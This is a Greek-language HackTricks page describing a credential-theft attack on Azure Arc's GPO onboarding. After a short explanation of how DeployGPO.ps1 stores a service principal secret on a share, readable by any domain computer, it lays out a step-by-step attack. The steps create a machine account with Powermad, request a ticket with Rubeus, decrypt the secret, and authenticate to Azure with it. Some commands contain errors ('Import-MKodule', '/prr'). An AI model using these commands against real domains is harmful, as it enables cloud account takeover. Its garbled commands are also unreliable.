# Az - Ευάλωτο Σενάριο Αναπτυγμένου GPO του Azure Arc

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης των HackTricks:

- Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στα HackTricks** ή να **κατεβάσετε τα HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
- Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
- Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
- **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

### Αναγνώριση των Προβλημάτων

Το Azure Arc επιτρέπει την ολοκλήρωση νέων εσωτερικών διακομιστών (διακομιστές που έχουν ενταχθεί στον τομέα) στο Azure Arc χρησιμοποιώντας τη μέθοδο Group Policy Object. Για να διευκολύνει αυτή τη διαδικασία, η Microsoft παρέχει ένα εργαλείο ανάπτυξης απαραίτητο για την έναρξη της διαδικασίας ενσωμάτωσης. Μέσα στο αρχείο ArcEnableServerGroupPolicy.zip, μπορούν να βρεθούν τα ακόλουθα σενάρια: DeployGPO.ps1, EnableAzureArc.ps1, και AzureArcDeployment.psm1.

Κατά την εκτέλεση, το σενάριο DeployGPO.ps1 εκτελεί τις ακόλουθες ενέργειες:

1. Δημιουργεί το Azure Arc Servers Onboarding GPO εντός του τοπικού τομέα.
2. Αντιγράφει το σενάριο ενσωμάτωσης EnableAzureArc.ps1 στον καθορισμένο κοινόχρηστο φάκελο που δημιουργήθηκε για τη διαδικασία ενσωμάτωσης, ο οποίος περιέχει επίσης το πακέτο εγκατάστασης των Windows.

Κατά την εκτέλεση αυτού του σεναρίου, οι διαχειριστές συστημάτων πρέπει να παρέχουν δύο κύριες παραμέτρους: **ServicePrincipalId** και **ServicePrincipalClientSecret**. Επιπλέον, απαιτούνται άλλες παράμετροι όπως τον τομέα, το FQDN του διακομιστή που φιλοξενεί τον κοινόχρηστο φάκελο, και το όνομα του κοινόχρηστου φακέλου. Πρέπει επίσης να παρέχονται λεπτομέρειες όπως το αναγνωριστικό του ενοικιαστή, η ομάδα πόρων, και άλλες απαραίτητες πληροφορίες στο σενάριο.

Ένα κρυπτογραφημένο μυστικό δημιουργείται στον κατάλογο AzureArcDeploy στον καθορισμένο κοινόχρηστο φάκελο χρησιμοποιώντας την κρυπτογράφηση DPAPI-NG. Το κρυπτογραφημένο μυστικό αποθηκεώνεται σε ένα αρχείο με το όνομα encryptedServicePrincipalSecret. Αποδείξεις γι' αυτό μπορούν να βρεθούν στο σενάριο DeployGPO.ps1, όπου η κρυπτογράφηση πραγματοποιείται καλώντας το ProtectBase64 με το $descriptor και το $ServicePrincipalSecret ως είσοδο. Το descriptor αποτελείται από τα SIDs των ομάδων Domain Computer και Domain Controller, εξασφαλίζοντας ότι το ServicePrincipalSecret μπορεί να αποκρυπτογραφηθεί μόνο από τις ομάδες ασφαλείας Domain Controllers και Domain Computers, όπως αναφέρεται στα σχόλια του σεναρίου.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Εκμετάλλευση

Έχουμε τις ακόλουθες συνθήκες:

1. Έχουμε εισβάλει με επιτυχία στο εσωτερικό δίκτυο.
2. Έχουμε τη δυνατότητα να δημιουργήσουμε ή να αναλάβουμε τον έλεγχο ενός λογαριασμού υπολογιστή εντός του Active Directory.
3. Έχουμε ανακαλύψει ένα κοινόχρηστο φάκελο που περιέχει τον κατάλογο AzureArcDeploy.

Υπάρχουν αρκετές μέθοδοι για την απόκτηση ενός λογαριασμού μηχανής εντός ενός περιβάλλοντος AD. Μία από τις πιο κοινές είναι η εκμετάλλευση του ορίου του λογαριασμού μηχανής. Μια άλλη μέθοδος περιλαμβάνει την εκμετάλλευση ενός λογαριασμού μηχανής μέσω ευάλωτων ACLs ή διάφορων άλλων λαθών ρυθμίσεων.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Μόλας που αποκτήθηκε ένα λογαριασμός μηχανής, είναι δυνατή η πιστοποίηση χρησιμοποιώντας αυτόν τον λογαριασμό. Μπορούμε είτε να χρησιμοποιήσουμε την εντολή runas.exe με τη σημαία netonly είτε να χρησιμοποιήσουμε το pass-the-ticket με το Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Έχοντας το TGT για το λογαριασμό του υπολογιστή μας αποθηκευμένο στη μνήμη, μπορούμε να χρησιμοποιήσουμε το ακόλουθο script για να αποκρυπτογραφήσουμε το μυστικό του υπηρεσιών πρωτεύοντος.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Εναλλακτικά, μπορούμε να χρησιμοποιήσουμε το [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

Σε αυτό το σημείο, μπορούμε να συγκεντρώσουμε τις υπόλοιπες πληροφορίες που χρειαζόμαστε για να συνδεθούμε στο Azure από το αρχείο ArcInfo.json, το οποίο αποθηκεύεται στον ίδιο κοινόχρηστο φάκελο με το αρχείο encryptedServicePrincipalSecret. Αυτό το αρχείο περιέχει λεπτομέρειες όπως: TenantId, servicePrincipalClientId, ResourceGroup, και άλλα. Με αυτές τις πληροφορίες, μπορούμε να χρησιμοποιήσουμε το Azure CLI για να πιστοποιηθούμε ως το υπηρεσιακό προνόμιο που έχει διαρρεύσει.

## Αναφορές

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)
